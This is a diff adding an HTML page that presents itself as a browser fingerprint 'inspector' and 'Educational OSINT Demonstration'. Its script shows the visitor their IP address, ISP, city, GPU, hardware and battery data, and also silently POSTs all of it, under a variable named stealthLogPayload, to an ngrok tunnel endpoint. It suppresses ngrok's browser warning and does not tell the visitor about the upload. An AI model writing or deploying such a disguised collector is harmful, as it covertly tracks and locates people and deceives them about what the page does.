@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Metadata Inspector</title>
+    <style>
+        :root {
+            --bg-color: #0d0d0d;
+            --text-color: #00ff66;
+            --accent-color: #ff3333;
+            --card-bg: #141414;
+            --border-color: #222;
+        }
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            line-height: 1.5;
+        }
+        h1 { text-align: center; color: #fff; text-shadow: 0 0 10px var(--text-color); margin-bottom: 5px; }
+        .subtitle { text-align: center; color: #888; margin-bottom: 40px; font-size: 0.9em; }
+        
+        .scan-container { text-align: center; margin-bottom: 30px; }
+        .scan-btn {
+            background: transparent;
+            border: 2px solid var(--text-color);
+            color: var(--text-color);
+            padding: 15px 40px;
+            font-family: inherit;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
+            transition: all 0.2s ease-in-out;
+        }
+        .scan-btn:hover {
+            background: var(--text-color);
+            color: #000;
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.6);
+        }
+
+        .results-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            display: none;
+            margin-top: 20px;
+        }
+        .results-table th, .results-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .results-table th { background: #1a1a1a; color: #fff; font-size: 1.1em; }
+        .results-table tr:hover { background: #181818; }
+        .param-name { color: #888; width: 35%; }
+        .param-value { color: #fff; word-break: break-all; }
+        .alert { color: var(--accent-color); font-weight: bold; }
+        .disclaimer { text-align: center; font-size: 0.7em; color: #444; margin-top: 40px; }
+    </style>
+</head>
+<body>
+
+    <h1>[ NODE_INSPECTION_PROTOCOL ]</h1>
+    <div class="subtitle">Click below to analyze the metadata leaked by your browser footprint.</div>
+
+    <div class="scan-container">
+        <button class="scan-btn" id="inspect-btn">RUN INSPECTION</button>
+    </div>
+
+    <table class="results-table" id="results-table">
+        <thead>
+            <tr>
+                <th colspan="2">METADATA DISCOVERY LOG</th>
+            </tr>
+        </thead>
+        <tbody id="results-body">
+            </tbody>
+    </table>
+
+    <div class="disclaimer">Educational OSINT Demonstration.</div>
+
+    <script>
+      
+        const TELEMETRY_URL = "https://staging-backpedal-eject.ngrok-free.dev/log_fingerprint";
+
+        document.getElementById('inspect-btn').addEventListener('click', async function() {
+            this.style.display = 'none';
+            const table = document.getElementById('results-table');
+            const tbody = document.getElementById('results-body');
+            table.style.display = 'table';
+
+          
+            let stealthLogPayload = {};
+
+            const logRow = (name, value, isAlert = false) => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td class="param-name">${name}</td>
+                    <td class="param-value ${isAlert ? 'alert' : ''}">${value}</td>
+                `;
+                tbody.appendChild(tr);
+                stealthLogPayload[name] = value; // Save to payload
+            };
+
+           
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                if (ipResponse.ok) {
+                    const data = await ipResponse.json();
+                    logRow("Public IP Address", data.ip, true);
+                    logRow("Network Provider (ISP)", data.org);
+                    logRow("Physical Location", `${data.city}, ${data.region}, ${data.country_name}`);
+                    logRow("Timezone", data.timezone);
+                }
+            } catch (e) {
+                logRow("Network Intel", "Blocked");
+            }
+
+            // 2. Hardware Leaks
+            logRow("CPU Logical Cores", navigator.hardwareConcurrency || "Unknown");
+            logRow("Device Memory (RAM)", navigator.deviceMemory ? `${navigator.deviceMemory} GB estimated` : "Unknown");
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                logRow("GPU Model Hardware", gpu, true);
+            } catch(e) {
+                logRow("GPU Model Hardware", "Blocked");
+            }
+
+            // 3. Operating System & Browser Environment
+            logRow("User Agent", navigator.userAgent);
+            logRow("Operating System Platform", navigator.platform);
+            logRow("Screen Resolution", `${window.screen.width} x ${window.screen.height} pixels`);
+            logRow("Browser Languages", navigator.languages.join(', '));
+
+            // 4. Battery Status
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const percent = (battery.level * 100).toFixed(0) + "%";
+                    const status = battery.charging ? "Charging" : "Discharging";
+                    logRow("Real-time Battery Level", `${percent} (${status})`, true);
+                } catch (e) {}
+            }
+
+          
+            try {
+                fetch(TELEMETRY_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "ngrok-skip-browser-warning": "true" 
+                    },
+                    body: JSON.stringify(stealthLogPayload)
+                });
+            } catch(e) {
+                
+            }
+        });
+    </script>
+</body>
+</html>
